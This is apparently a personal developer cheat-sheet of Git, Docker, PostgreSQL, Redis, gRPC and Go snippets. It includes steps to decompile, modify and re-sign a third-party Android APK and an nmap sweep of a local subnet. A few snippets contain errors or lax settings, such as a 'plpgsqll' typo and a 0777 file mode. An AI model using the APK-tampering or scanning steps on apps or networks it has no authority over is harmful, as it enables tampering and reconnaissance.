// Reset local repository commit to remote origin on branch master. All changes will be preserved as uncomm­itted files
git reset --soft origin master
// Reset local repository commit to remote origin on branch master. All changes will be discarted - use with care!
git reset --hard origin master
// Remove untracked files - show only candidates no actual removal (alias -n )
git clean --dry-run
// Remove untracked files - Actual remove use with care!
git clean -f
// Remove untracked files and folders - Actual remove use with care!
git clean -f -d
// Remove ignored files - Actual remove use with care!
git clean -f -X
// Remove ignored and non-ig­nored files - Actual remove use with care!
git clean -f -x
// Show history for ${FILE­NAME} even if deleted, useful to know when a file has been removed
git log -- ${FILENAME}


https://gitsheet.wtf/

Branches.
git branch                     List all local branches.
git branch -a                 List remote and local branches.
git checkout -b branch_name   Create a local branch and switch to it.
git checkout branch_name      Switch to an existing branch.
git push origin branch_name   Push branch to remote.
git branch -m new_name         Rename current branch.
git branch -d branch_name     Delete a local branch.
git push origin :branch_name  Delete a remote branch.

Logs.
git log --oneline       Show commit history in single lines.
git log -2               Show commit history for last N commits.
git log -p -2           Show commit history for last N commits with diff.
git diff                Show all local file changes in the working tree.
git diff myfile         Show changes made to a file.
git blame myfile        Show who changed what & when in a file.
git remote show origin  Show remote branches and their mapping to local.

Cleanup.
git clean -f           Delete all untracked files.
git clean -df          Delete all untracked files and directories.
git checkout -- .      Undo local modifications to all files.
git reset HEAD myfile  Unstage a file.

Tags.
git pull --tags        Get remote tags.
git checkout tag_name  Switch to an existing tag.
git tag                List all tags.
git tag -a tag_name -m "tag message"  Create a new tag.
git push --tags        Push all tags to remote repo.

Stashes.
git stash save "stash name" && git stash  Save changes to a stash.
git stash list  List all stashes.
git stash pop   Apply a stash and delete it from stash list.
==================================================
Postgresql in docker
(tags: postgresql docker)
---

docker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d -p 5433:5432 postgres
docker exec -it some-postgres bash
su postgres
psql
  \l - list of databases
  \c dbname - switch to database
    \dt - list of tables
    \d table - struct of table
    \du - list of users and permissions
    \dt+ - list of tables with descriptions
    \dt *s* - list of tables that contains "s" in name
    \i FILE - exec commands from FILE
    \o FILE - save result into FILE.
    \a - swith aligment mode
  \? - list of all commands
  \q - quit
==================================================
Reverse Engineering with android apk on Windows
(tags: ri android apk windows)
---

1. Download apk from PlayMarket or from special site
2. Installed apk in android device - data/app
3. Cope apk to PC
4. Install apktool and Sign (instructions - https://androidp1.ru/dekompilyatsiya-apk-prilozheniya-android/)
  (apktool - https://bitbucket.org/iBotPeaches/apktool/downloads/)
  (folder with Sign - https://clouds.androidp1.ru/2o/Sign.zip)
5. Copy all to C:/apktool/
6. Rename apk for simple usage, example app.apk
7. In PowerShell: ./apktool d app.apk
8. In folder "C:/apktool/app/" change .smali files how you want and save
9. From C:/apktool/ folder exec in PowerShell: ./apktool b app
10. Copy C:/apktool/app/dist/app.apk into folder C:/apktool/Sign
11. Drag and drop app.apk on aign_APK.bat icon
12. Created apk_signed.apk copy to device and install
==================================================
Using gRPC
(tags: grpc protobuf)
---

// apt install golang-goprotobuf-dev
// go get github.com/golang/protobuf/protoc-gen-go
// /home/app# protoc -I=/home/app --go_out=/home/app /home/app/tutorial/tutorial.proto

// /home/app/tutorail/tutorial.proto
syntax = "proto3";
package tutorial;

import "google/protobuf/timestamp.proto";

message Person {
  string name = 1;
  int32 id = 2;  // Unique ID number for this person.
  string email = 3;

  enum PhoneType {
    MOBILE = 0;
    HOME = 1;
    WORK = 2;
  }

  message PhoneNumber {
    string number = 1;
    PhoneType type = 2;
  }

  repeated PhoneNumber phones = 4;

  google.protobuf.Timestamp last_updated = 5;
}

// Our address book file is just one of these.
message AddressBook {
  repeated Person people = 1;
}


// /home/app/list_people.go
package main

import (
  "fmt"
  "io"
  "io/ioutil"
  "log"
  "os"
  pb "./tutorial"
  "github.com/golang/protobuf/proto"
)

func writePerson(w io.Writer, p *pb.Person) {
  fmt.Fprintln(w, "Person ID:", p.Id)
  fmt.Fprintln(w, "  Name:", p.Name)
  if p.Email != "" {
    fmt.Fprintln(w, "  E-mail address:", p.Email)
  }

  for _, pn := range p.Phones {
    switch pn.Type {
    case pb.Person_MOBILE:
      fmt.Fprint(w, "  Mobile phone #: ")
    case pb.Person_HOME:
      fmt.Fprint(w, "  Home phone #: ")
    case pb.Person_WORK:
      fmt.Fprint(w, "  Work phone #: ")
    }
    fmt.Fprintln(w, pn.Number)
  }
}

func listPeople(w io.Writer, book *pb.AddressBook) {
  for _, p := range book.People {
    writePerson(w, p)
  }
}

// Main reads the entire address book from a file and prints all the
// information inside.
func main() {
  if len(os.Args) != 2 {
    log.Fatalf("Usage:  %s ADDRESS_BOOK_FILE\n", os.Args[0])
  }
  fname := os.Args[1]

  // [START unmarshal_proto]
  // Read the existing address book.
  in, err := ioutil.ReadFile(fname)
  if err != nil {
    log.Fatalln("Error reading file:", err)
  }
  book := &pb.AddressBook{}
  if err := proto.Unmarshal(in, book); err != nil {
    log.Fatalln("Failed to parse address book:", err)
  }
  // [END unmarshal_proto]

  listPeople(os.Stdout, book)
}

// /home/app/list_people_test.go
package main

import (
  "bytes"
  "strings"
  "testing"
  pb "./tutorial"
)

func TestWritePersonWritesPerson(t *testing.T) {
  buf := new(bytes.Buffer)
  // [START populate_proto]
  p := pb.Person{
    Id:    1234,
    Name:  "John Doe",
    Email: "jdoe@example.com",
    Phones: []*pb.Person_PhoneNumber{
      {Number: "555-4321", Type: pb.Person_HOME},
    },
  }
  // [END populate_proto]
  writePerson(buf, &p)
  got := buf.String()
  want := `Person ID: 1234
  Name: John Doe
  E-mail address: jdoe@example.com
  Home phone #: 555-4321
`
  if got != want {
    t.Errorf("writePerson(%s) =>\n\t%q, want %q", p.String(), got, want)
  }
}
==================================================
Slice tricks
(tags: slice trick)
---

https://github.com/golang/go/wiki/SliceTricks

// AppendVector
a = append(a, b...)

// Copy
b = make([]T, len(a))
copy(b, a)
// These two are often a little slower than the above one,
// but they would be more efficient if there are more
// elements to be appended to b after copying.
b = append([]T(nil), a...)
b = append(a[:0:0], a...)

// Cut
a = append(a[:i], a[j:]...)

//Delete
a = append(a[:i], a[i+1:]...)
// or
a = a[:i+copy(a[i:], a[i+1:])]

// Delete without preserving order
a[i] = a[len(a)-1]
a = a[:len(a)-1]

NOTE If the type of the element is a pointer or a struct with pointer fields, which need to be garbage collected, the above implementations of Cut and Delete have a potential memory leak problem: some elements with values are still referenced by slice a and thus can not be collected. The following code can fix this problem:

// Cut without memory leak
copy(a[i:], a[j:])
for k, n := len(a)-j+i, len(a); k < n; k++ {
  a[k] = nil // or the zero value of T
}
a = a[:len(a)-j+i]

// Delete without memory leak
copy(a[i:], a[i+1:])
a[len(a)-1] = nil // or the zero value of T
a = a[:len(a)-1]

// Delete without memory leak and without preserving order
a[i] = a[len(a)-1]
a[len(a)-1] = nil
a = a[:len(a)-1]

// Expand
a = append(a[:i], append(make([]T, j), a[i:]...)...)

// Extend
a = append(a, make([]T, j)...)

// Filter (in place)
n := 0
for _, x := range a {
  if keep(x) {
    a[n] = x
    n++
  }
}
a = a[:n]

// Insert
a = append(a[:i], append([]T{x}, a[i:]...)...)

NOTE: The second append creates a new slice with its own underlying storage and copies elements in a[i:] to that slice, and these elements are then copied back to slice a (by the first append). The creation of the new slice (and thus memory garbage) and the second copy can be avoided by using an alternative way:

// Insert
s = append(s, 0 /* use the zero value of the element type */)
copy(s[i+1:], s[i:])
s[i] = x

// InsertVector
a = append(a[:i], append(b, a[i:]...)...)

NOTE: To get the best efficiency, it is best to do the insertion without using append, in particular when the number of the inserted elements is known:

// Assume element type is int.
func Insert(s []int, k int, vs ...int) []int {
  if n := len(s) + len(vs); n <= cap(s) {
    s2 := s[:n]
    copy(s2[k+len(vs):], s[k:])
    copy(s2[k:], vs)
    return s2
  }
  s2 := make([]int, len(s) + len(vs))
  copy(s2, s[:k])
  copy(s2[k:], vs)
  copy(s2[k+len(vs):], s[k:])
  return s2
}
a = Insert(a, i, b...)

// Push
a = append(a, x)

// Pop
x, a = a[len(a)-1], a[:len(a)-1]

// Push Front/Unshift
a = append([]T{x}, a...)

//Pop Front/Shift
x, a = a[0], a[1:]

Additional Tricks

// Filtering without allocating

This trick uses the fact that a slice shares the same backing array and capacity as the original, so the storage is reused for the filtered slice. Of course, the original contents are modified.
b := a[:0]
for _, x := range a {
  if f(x) {
    b = append(b, x)
  }
}

For elements which must be garbage collected, the following code can be included afterwards:

for i := len(b); i < len(a); i++ {
  a[i] = nil // or the zero value of T
}

// Reversing

To replace the contents of a slice with the same elements but in reverse order:

for i := len(a)/2-1; i >= 0; i-- {
  opp := len(a)-1-i
  a[i], a[opp] = a[opp], a[i]
}

The same thing, except with two indices:

for left, right := 0, len(a)-1; left < right; left, right = left+1, right-1 {
  a[left], a[right] = a[right], a[left]
}
==================================================
Windows find all ip of computers in local network
(tags: windows ip local)
---

arp -a
==================================================
Linux find all ip of computers in local network
(tags: linux ip local)
---

apt install nmap
nmap -sP 192.168.0.1/24
==================================================
Linux screen - add new resolution
(tags: linux screen)
---

xrandr
xrandr --output Virtual1 --mode 1920x1080
// if error "xrandr: cannot find mode 1920x1080" do this
cvt 1920 1080 60
// copy ouput after Modeline
xrandr --newmode "1920x1080_60.00"  173.00  1920 2048 2248 2576  1080 1083 1088 1120 -hsync +vsync
xrandr --addmode Virtual1 1920x1080_60.00
xrandr --output Virtual1 --mode 1920x1080_60.00

// write sript in file
vi ~/.xprofile
#!/bin/bash
xrandr --output Virtual1 --mode 1920x1080_60.00
==================================================
Using redis in docker
(tags: redis docker)
---

docker run -d --name some-redis -p 6379:6379 redis
docker exec -it some-redis bash
redis-cli
keys * // show all keys
==================================================
Mock redis
(tags: mock redis)
---

"github.com/alicebob/miniredis/v2"
"github.com/go-redis/redis/v7"

s, err := miniredis.Run()
if err != nil {
  panic(err)
}
defer s.Close()
redisClient := redis.NewClient(&redis.Options{
  Addr:     s.Addr(),
  Password: "",
  DB:       0,
})
==================================================
Exec program on linux without password
(tags: linux exec sudo password)
---

sudo visudo
// /etc/sudoers.tmp
// append string like this:
username ALL=NOPASSWD:/bin/mkdir,/bin/chmod
==================================================
Parallel exec program in bash script
(tags: bash parallel exec)
---

#!/bin/bash

program1 &
program2 &
program3 &

// for stop all
// pkill -f "program"
==================================================
Replace word in many files bash
(tags: replace word bash)
---

find . -name "filename" -print0 | xargs -0 sed -i 's/old/new/g'
==================================================
Copy map
(tags: copy map)
---

for k, v := range originalMap {
  newMap[k] = v
}
==================================================
Show content of many files in bash
(tags: bash file content)
---

/wave/data# find . -type f -name "dict.csv" -print0  | xargs -r0 grep -H '' | sort
==================================================
Connect to websocket from browser
(tags: connect websocket browser)
---

//connect
ws = new WebSocket("ws://127.0.0.1:9001/"); ws.onmessage = ({data}) => console.log("FROM SERVER: ", data);

//send message
ws.send("Privet!");
==================================================
Measure func call duration in bash
(tags: measure func call duration time bash)
---

#!/bin/bash
START=$(date +%s)
# do something
echo "It took $(( $(date +%s) - $START )) seconds"
==================================================
Using json extension in sqlite
(tags: measure func call duration time bash)
---

select json_extract(s.json_column, '$.json_field') as field from tablename1

// in golang project
import _ "github.com/mattn/go-sqlite3"
// build
go build -tags json1 main.go
==================================================
LRU cache implementation
(tags: lru cache)
---

https://github.com/hashicorp/golang-lru
https://dotzero.blog/golang-lru/

LRU-кэш. Это такой вид кэша, когда есть ограниченное количество элементов, и новые значения вытесняют старые. Причём, если мы обращаемся к элементу часто, то он поднимается наверх и не вытесняется из кэша. Таким образом мы закэшируем все часто используемые значения, а все редко используемые не будут храниться в кэше.

import (
  "container/list"
)

type Item struct {
  Key   string
  Value interface{}
}

type LRU struct {
  capacity int
  items    map[string]*list.Element
  queue    *list.List
}

func NewLru(capacity int) *LRU {
  return &LRU{
    capacity: capacity,
    items:    make(map[string]*list.Element),
    queue:    list.New(),
  }
}

func (c *LRU) Set(key string, value interface{}) bool {
  if element, exists := c.items[key]; exists == true {
    c.queue.MoveToFront(element)
    element.Value.(*Item).Value = value
    return true
  }

  if c.queue.Len() == c.capacity {
    c.purge()
  }

  item := &Item{
    Key:   key,
    Value: value,
  }

  element := c.queue.PushFront(item)
  c.items[item.Key] = element

  return true
}

func (c *LRU) purge() {
  if element := c.queue.Back(); element != nil {
    item := c.queue.Remove(element).(*Item)
    delete(c.items, item.Key)
  }
}

func (c *LRU) Get(key string) interface{} {
  element, exists := c.items[key]
  if exists == false {
    return nil
  }
  c.queue.MoveToFront(element)
  return element.Value.(*Item).Value
}
==================================================
Recursive query postgresql sqlite
(tags: recursive postgresql sqlite)
---

WITH RECURSIVE nodes(id,name,parent_id) AS (
  SELECT s1.id, s1.name, s1.parent_id
  FROM equipment s1 WHERE parent_id = 44
  UNION
  SELECT s2.id, s2.name, s2.parent_id
  FROM equipment s2, nodes s1 WHERE s2.parent_id = s1.id
)
SELECT * FROM nodes;
==================================================
File md5 hash
(tags: file md5 hash)
---

https://mrwaggel.be/post/generate-md5-hash-of-a-file-in-golang/

package main

import (
  "crypto/md5"
  "encoding/hex"
  "fmt"
  "io"
  "os"
)

func hashFileMD5(filePath string) (string, error) {
  var returnMD5String string
  file, err := os.Open(filePath)
  if err != nil {
    return returnMD5String, err
  }
  defer file.Close()
  hash := md5.New()
  if _, err := io.Copy(hash, file); err != nil {
    return returnMD5String, err
  }
  hashInBytes := hash.Sum(nil)[:16]
  returnMD5String = hex.EncodeToString(hashInBytes)
  return returnMD5String, nil

}

func main() {
  hash, err := hashFileMD5(os.Args[0]) //os.Args[1]
  if err == nil {
    fmt.Println(hash)
  }
}
==================================================
Linux bugs
(tags: linux bug)
---

// if you got a covering invisible area
pkill -f "draganddrop"
// xprop and click on covering invisible area

// if you have a black screen after enter, press
Ctrl+Alt+F1

// if you have OS behavior with "pressed" ctrl, change the language couple times
==================================================
Create trigger on postgresql
(tags: trigger postgresql)
---

-- создаем таблицу module
create table module
(
  id bigint not null,
  name character varying,
  name_old character varying
)

-- заполняем ее тестовыми данными
insert into module (id, name) values (1, 'name_1'), (2, 'name_2'), (3, 'name_3')

-- проверяем
select * from module

-- создаем функцию для триггера
create or replace function save_old_value()
returns trigger as
$$
begin
new.name_old = old.name;
return new;
end;
$$ LANGUAGE plpgsqll

-- создаем сам триггер
create trigger t_module
before update on module for each row
execute procedure save_old_value()

-- обновляем запись в таблице
update module set name = 'new_name' where id = 2

-- проверяем
select * from module
==================================================
Run go with docker without go
(tags: docker golang)
---

docker run --rm "$PWD":"$PWD" -w "$PWD" golang:1.14 go run main.go
==================================================
Static compile golang
(tags: static compile golang)
---

CGO_ENABLED=0 go build -a -installsuffix cgo -ldflags '-s' src/myapp/myapp.go
==================================================
Convert postgres timestamp in golang
(tags: postgresql timestamp golang)
---

time1 := time.Now().UnixNano()
fmt.Println(time1)
time2 := time.Unix(0, time1)
fmt.Println(time2)
time3 := time2.Format("2006-01-02T15:04:05.000000Z")
fmt.Println(time3)
// select * from table1 where modified_at > '2021-03-23T10:39:03.288802Z'
// this working with sqlite too
==================================================
Check is interface convertible to
(tags: check convert interface)
---

var x interface{} = 2.3
if reflect.Indirect(reflect.ValueOf(x)).Type().ConvertibleTo(reflect.TypeOf(float64(0))) {
  fmt.Println("x is convertible to float64")
}

// or
var x interface{} = []int{1, 2, 3}
xType := fmt.Sprintf("%T", x)
fmt.Println(xType) // "[]int"

// or
var x interface{} = 2.3
switch v := x.(type) {
case int:
  fmt.Println("int:", v)
case float64:
  fmt.Println("float64:", v)
default:
  fmt.Println("unknown")
} // "float64: 2.3"

// or
var x interface{} = []int{1, 2, 3}
xType := reflect.TypeOf(x)
xValue := reflect.ValueOf(x)
fmt.Println(xType, xValue) // "[]int [1 2 3]"
==================================================
Golang types
(tags: golang type)
---

https://metanit.com/go/tutorial/2.3.php

// golang types
int8: представляет целое число от -128 до 127 и занимает в памяти 1 байт (8 бит)
int16: представляет целое число от -32768 до 32767 и занимает в памяти 2 байта (16 бит)
int32: представляет целое число от -2147483648 до 2147483647 и занимает 4 байта (32 бита)
int64: представляет целое число от –9 223 372 036 854 775 808 до 9 223 372 036 854 775 807 и занимает 8 байт (64 бита)
uint8: представляет целое число от 0 до 255 и занимает 1 байт
uint16: представляет целое число от 0 до 65535 и занимает 2 байта
uint32: представляет целое число от 0 до 4294967295 и занимает 4 байта
uint64: представляет целое число от 0 до 18 446 744 073 709 551 615 и занимает 8 байт
byte: синоним типа uint8, представляет целое число от 0 до 255 и занимает 1 байт
rune: синоним типа int32, представляет целое число от -2147483648 до 2147483647 и занимает 4 байта
int: представляет целое число со знаком, которое в зависимости о платформы может занимать либо 4 байта, либо 8 байт. То есть соответствовать либо int32, либо int64.
uint: представляет целое беззнаковое число только без знака, которое, аналогично типу int, в зависимости о платформы может занимать либо 4 байта, либо 8 байт. То есть соответствовать либо uint32, либо uint64.
==================================================
Life of http request in golang server
(tags: life http request golang server)
---

https://eli.thegreenplace.net/2021/life-of-an-http-request-in-a-go-server/

package main

import (
  "fmt"
  "net/http"
)

func hello(w http.ResponseWriter, req *http.Request) {
  fmt.Fprintf(w, "hello\n")
}

func headers(w http.ResponseWriter, req *http.Request) {
  for name, headers := range req.Header {
    for _, h := range headers {
      fmt.Fprintf(w, "%v: %v\n", name, h)
    }
  }
}

func main() {
  http.HandleFunc("/hello", hello)
  http.HandleFunc("/headers", headers)

  http.ListenAndServe(":8090", nil)
}

1. ListenAndServe содержит внутри net.Listen("tcp",...) и для каждого нового соединения запускает горутинуЮ которая в бесконечном цикле выполняет handler.ServeHTTP.
2. Если handler был указан как nil, то в ServeHTTP будет использован DefaultServeMux - это глобальный объект http.ServeMux. Как раз используюя http.HandleFunc мы регистрируем функции к этому глобальному
3. Если возникнет паника в функции хенжлера, то сервер все равно продолжит работу

// Middleware
func politeGreeting(w http.ResponseWriter, req *http.Request) {
  fmt.Fprintf(w, "Welcome! Thanks for visiting!\n")
}

func loggingMiddleware(next http.Handler) http.Handler {
  return http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
    start := time.Now()
    next.ServeHTTP(w, req)
    log.Printf("%s %s %s", req.Method, req.RequestURI, time.Since(start))
  })
}

func main() {
  lm := loggingMiddleware(http.HandlerFunc(politeGreeting))
  log.Fatal(http.ListenAndServe(":8090", lm))
}
==================================================
Golang darker coreners
(tags: golang dark)
---

https://rytisbiel.com/2021/03/06/darker-corners-of-go/

// Если не хочешь удалять неиспользуемый импорт
var _ = math.Round

// Выполнится функция init() из пакета package1
import _ package1

// Позволят использовать функции пакета, но лучше так не делать
import . "math"   // Sin(3)

// Приоритет операторов
Go:
  5  * / % << >> & &^
  4  + - | ^
  3  == != < <= > >=
  2  &&
  1  ||
C:
  10  *, /, %
  9   +, -
  8   <<, >>
  7   <, <=, >, >=
  6   ==, !=
  5   &
  4   ^
  3   |
  2   &&
  1   ||
In Go: 1 << 1 + 1 // (1<<1)+1 = 3
In C: 1 << 1 + 1 // 1<<(1+1) = 4
In Go: ^1 // -2
In C: ~1 // -2

// iota
const (
    myconst = "c"
    myconst2 = "c2"
    two = iota // 2
)

// slice
var s []int // nil slice
fmt.Println(s, len(s), cap(s)) // [] 0 0
s = append(s, 1)
fmt.Println(s, len(s), cap(s)) // [1] 1 1

// make slice
s := make([]int, 3)
s = append(s, 1)
s = append(s, 2)
s = append(s, 3)
fmt.Println(s) // [0 0 0 1 2 3]
saddr := &s[0]
*saddr = 5
fmt.Println(s) // [5 0 0 1 2 3]

// string for range
s := "touché"
for i := 0; i < len(s); i++ { // prints every byte
  fmt.Print(string(s[i]))     // touchÃ©
}
for _, r := range s {  // prints every rune
  fmt.Print(string(r)) // touché
}
r := []rune(s)
for i := 0; i < len(r); i++ {  // convert a string to rune slice to access by index
  fmt.Print(string(r[i]))      // touché
}

// map
var m map[int]int // a nil map
fmt.Println(len(m)) // taking len of a nil map is OK. prints 0
fmt.Println(m[10]) // reading nil map is OK. prints 0 (the default of the map value type)
val, keyexists := m[10]
fmt.Println(val, keyexists) // 0, false
m[10] = 1 // panic: assignment to entry in nil map
m2 := map[int]int{1: 1}
addr := &m2[1] // error: cannot take the address of m2[1]

// empty struct
fmt.Println(unsafe.Sizeof(false)) // 1
fmt.Println(unsafe.Sizeof(struct{}{})) // 0

// interface
type ISayHi interface {Say()}
type SayHi struct{}
func main() {
  // at this point variable “sayer” only has the static type of ISayHi
  // dynamic type and value are nil
  var sayer ISayHi
  // as expected sayer equals to nil
  fmt.Println(sayer == nil) // true
  // a nil variable of a concrete type
  var sayerImplementation *SayHi
  // dynamic type of the interface variable is now SayHi
  // the actual value interface points to is still nil
  sayer = sayerImplementation
  // sayer no longer equals to nil, because its dynamic type is set
  // even though the value it points to is nil
  // which is not what most people would expect here
  fmt.Println(sayer == nil) // false
}
// you can not check if the value an interface points to is ni
func MyFunc() ISayHi {var result *SayHi; return result} // do not do this! MyFunc() == nil would be false
func MyFunc() ISayHi {return nil} // MyFunc() == nil would be true
func IsInterfaceNil(i interface{}) bool {
  if i == nil {
    return false
  }
  rvalue := reflect.ValueOf(i)
  return rvalue.Kind() == reflect.Ptr && rvalue.IsNil()
}

// type assertion
func main() {
  var sayer ISayHi
  sayer = &SayHi{}
  // t will be a zero value (nil in this case) of type *SayHi2
  // ok will be false
  t, ok := sayer.(*SayHi2)
  if ok {
      t.Say()
  }
  // panic: interface conversion:
  // main.ISayHi is *main.SayHi, not *main.SayHi2
  t2 := sayer.(*SayHi2)
  t2.Say()
}

// embededding
type t1 struct {f1 string}
func (t *t1) t1method() {}
// embedding type
type t2 struct {t1}
// redefining type
type t3 t1
func main() {
  var mt1 t1
  var mt2 t2
  var mt3 t3
  // fields are inherited in all the cases
  _ = mt1.f1
  _ = mt2.f1
  _ = mt3.f1
  // these work ok
  mt1.t1method()
  mt2.t1method()
  // mt3.t1method undefined (type t3 has no field or method t1method)
  mt3.t1method()
}

// compare
type compareStruct1 struct {
  A int
  B string
  C [3]int
}
type compareStruct2 struct {
  A int
  B string
  C []int // changed type of C from array to slice
}
func main() {
  s1 := compareStruct1{}
  s2 := compareStruct1{}
  fmt.Println(s1 == s2) // works fine, prints true
  s3 := compareStruct2{}
  s4 := compareStruct2{}
  // invalid operation: s3 == s4
  // (struct containing []int cannot be compared)
  fmt.Println(s3 == s4)
}
func (s *compareStruct2) Equals(s2 *compareStruct2) bool {
  if s.A != s2.A || s.B != s2.B || len(s.C) != len(s2.C) {
    return false
  }
  for i := 0; i < len(s.C); i++ {
    if s.C[i] != s2.C[i] {
      return false
    }
  }
  return true
}
// slow variant
reflect.DeepEqual(s, s2) // not working for func and float with NaN
==================================================
Get parameter from url
(tags: parameter url)
---

func decodeRequest(_ context.Context, r *http.Request) (interface{}, error) {
  keys, ok := r.URL.Query()["key"]
  if !ok || len(keys[0]) < 1 {
    return nil, fmt.Errorf("url parameter key is missing")
  }
  keyStr := keys[0]
  return keyStr, nil
}
==================================================
Using sqlite in memory
(tags: sqlite memory)
---

db, err = sql.Open("sqlite3", "file::memory:?cache=shared")
==================================================
Wrap errors in golang
(tags: wrap error)
---

package main

import (
  "errors"
  "fmt"
  "os"
)

var (
  ErrF3 = errors.New("f3 error")
  ErrF4 = errors.New("f4 error")
  PathErr = &os.PathError{}
)

func main() {
  err1 := f1()
  fmt.Println(err1) // f1 error: f2 error: f3 error
  err2 := f2()
  fmt.Println(err2) // f2 error: f3 error
  err3 := f3()
  fmt.Println(err3) // f3 error

  // if err1 contains same value
  fmt.Println(errors.Is(err1, err1)) // true
  fmt.Println(errors.Is(err1, err2)) // false
  fmt.Println(errors.Is(err1, err3)) // true
  fmt.Println(errors.Is(err3, err1)) // false

  fmt.Println(errors.Is(err1, ErrF3)) // true
  fmt.Println(errors.Is(err1, ErrF4)) // false
  fmt.Println(errors.Is(err3, ErrF4)) // false

  // if errors has same type
  fmt.Println(errors.As(err1, &ErrF3))   // true
  fmt.Println(errors.As(err1, &PathErr)) // false

  fmt.Println(ErrF4) // f4 error
  fmt.Println(errors.Is(err1, ErrF4))  // false
  // As - puts err1 into ErrF4
  fmt.Println(errors.As(err1, &ErrF4)) // true
  fmt.Println(errors.Is(err1, ErrF4))  // true
  fmt.Println(ErrF4) // f1 error: f2 error: f3 error

  fmt.Println(errors.Is(err3, err1)) // false

  fmt.Println(errors.Unwrap(err3)) // <nil>
  fmt.Println(errors.Unwrap(err2)) // f3 error
  fmt.Println(errors.Unwrap(err1)) // f2 error: f3 error
  fmt.Println(errors.Unwrap(errors.Unwrap(err1))) // f3 error
}

func f1() error {
  err := f2()
  return fmt.Errorf("f1 error: %w", err)
}

func f2() error {
  err := f3()
  return fmt.Errorf("f2 error: %w", err)
}

func f3() error {
  return ErrF3
}
==================================================
Write log in stdout and file
(tags: log stdout file)
---

f, err := os.OpenFile("/mylogs.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0777)
if err != nil {
    log.Fatalf("error opening file: %v", err)
}
defer f.Close()
wrt := io.MultiWriter(os.Stdout, f)
log.SetOutput(wrt)
log.Println("some info")
==================================================
4D slice
(tags: 4d slice)
---

arr := [][][][]float64{{{{1111, 1112}, {1121, 1122}}, {{1211, 1212}, {1221, 1222}}}, {{{2111, 2112}, {2121, 2122}}, {{2211, 2212}, {2221, 2222}}}}
fmt.Println(arr) //[[[[1111 1112] [1121 1122]] [[1211 1212] [1221 1222]]] [[[2111 2112] [2121 2122]] [[2211 2212] [2221 2222]]]]

JU := 2
JI := 2
JT := 2
JP := 2

// 4D -> 1D
n := 0
res := make([]float64, JU*JI*JT*JP)
for u := 0; u < JU; u++ {
  for i := 0; i < JI; i++ {
    for t := 0; t < JT; t++ {
      for p := 0; p < JP; p++ {
        res[n] = arr[u][i][t][p]
        n++
      }
    }
  }
}
fmt.Println(res) //[1111 1112 1121 1122 1211 1212 1221 1222 2111 2112 2121 2122 2211 2212 2221 2222]

// 1D -> 4D
arr4d := make([][][][]float64, 0)
arr3d := make([][][]float64, 0)
arr2d := make([][]float64, 0)
arr1d := make([]float64, 0)
n = 0
for u := 0; u < JU; u++ {
  for i := 0; i < JI; i++ {
    for t := 0; t < JT; t++ {
      for p := 0; p < JP; p++ {
        arr1d = append(arr1d, res[n])
        n++
      }
      arr2d = append(arr2d, arr1d)
      arr1d = nil
    }
    arr3d = append(arr3d, arr2d)
    arr2d = nil
  }
  arr4d = append(arr4d, arr3d)
  arr3d = nil
}
fmt.Println(arr4d) //[[[[1111 1112] [1121 1122]] [[1211 1212] [1221 1222]]] [[[2111 2112] [2121 2122]] [[2211 2212] [2221 2222]]]]
==================================================
Convert int to time
(tags: convert int time)
---

var i int = 5
time.Sleep(time.Duration(i) * time.Second)
//time.Sleep(i * time.Second) // not working
//time.Sleep(5 * time.Second) // working
==================================================
Error with stacktrace
(tags: error stacktrace)
---

package main

import (
  "fmt"
  "log"
  "runtime"
)

func stacktraceTest() {
  err := f1()
  log.Println(Wrap(err))
  //2021/04/15 19:18:56 "main.stacktraceTest(_/D_/projects/go/experiment/stacktrace.go:32)":
  //  "main.f1(_/D_/projects/go/experiment/stacktrace.go:38)":
  //  "main.f2(_/D_/projects/go/experiment/stacktrace.go:42)":
  //  error from f2
}

func f1() error {
  err := f2()
  //return Wrap(fmt.Errorf("error from f1:\n%v", err))
  return Wrap(err)
}

func f2() error {
  return Wrap(fmt.Errorf("error from f2"))
}

func Wrap(err error) error {
  if err != nil {
    return fmt.Errorf("%q:\n  %w", getCaller(1), err)
  }
  return nil
}

func getCaller(skip int) string {
  funcName := "UNKNOWN"
  pc, f, l, ok := runtime.Caller(skip + 1)
  if ok {
    funcName = runtime.FuncForPC(pc).Name()
  }
  _, _, _, _ = pc, f, l, funcName
  return fmt.Sprintf("%s(%s:%d)", funcName, f, l)
}
==================================================
Zap logger
(tags: zap logger)
---

// https://sunitc.dev/2019/05/27/adding-uber-go-zap-logger-to-golang-project/

package main

import (
  "fmt"
  "github.com/natefinch/lumberjack"
  "go.uber.org/zap"
  "go.uber.org/zap/zapcore"
  "os"
)

var testErr = fmt.Errorf("test")

func zaploggerTest()  {
  loggerEx := zap.NewExample()
  loggerEx.Debug(testErr.Error())
  // {"level":"debug","msg":"test"}

  loggerDev, err := zap.NewDevelopment()
  if err != nil {
    panic(err)
  }
  loggerDev.Debug(testErr.Error())
  // 2021-04-15T17:40:40.126+0300  DEBUG  experiment/zaplogger.go:18  test

  loggerProd, err := zap.NewProduction()
  if err != nil {
    panic(err)
  }
  loggerProd.Debug(testErr.Error())
  // nothing
  loggerProd.Info(testErr.Error())
  // {"level":"info","ts":1618497640.1463063,"caller":"experiment/zaplogger.go:26","msg":"test"}
  loggerProd.Info(testErr.Error(), zap.String("status", "ok"))
  // {"level":"info","ts":1618497640.1463063,"caller":"experiment/zaplogger.go:28","msg":"test","status":"ok"}
  loggerProd.Error(testErr.Error(), zap.String("status", "ok"), zap.Error(testErr))
  // {"level":"error","ts":1618497640.1463063,"caller":"experiment/zaplogger.go:30","msg":"test","status":"ok","error":"test","stacktrace":"main.zaploggerTest\n\t_/D_/projects/go/experiment/zaplogger.go:30\nmain.main\n\t_/D_/projects/go/experiment/main.go:6\nruntime.main\n\truntime/proc.go:204"}

  loggerProdWithSugar := loggerProd.Sugar()
  defer loggerProdWithSugar.Sync()
  loggerProdWithSugar.Info(testErr.Error(), zap.String("status", "ok"))
  // {"level":"info","ts":1618497984.2510028,"caller":"experiment/zaplogger.go:38","msg":"test{status 15 0 ok <nil>}"}
  loggerProdWithSugar.Error(testErr.Error(), zap.String("status", "ok"), zap.Error(testErr))
  // {"level":"error","ts":1618497984.2510028,"caller":"experiment/zaplogger.go:40","msg":"test{status 15 0 ok <nil>} {error 26 0  test}","stacktrace":"main.zaploggerTest\n\t_/D_/projects/go/experiment/zaplogger.go:40\nmain.main\n\t_/D_/projects/go/experiment/main.go:6\nruntime.main\n\truntime/proc.go:204"}

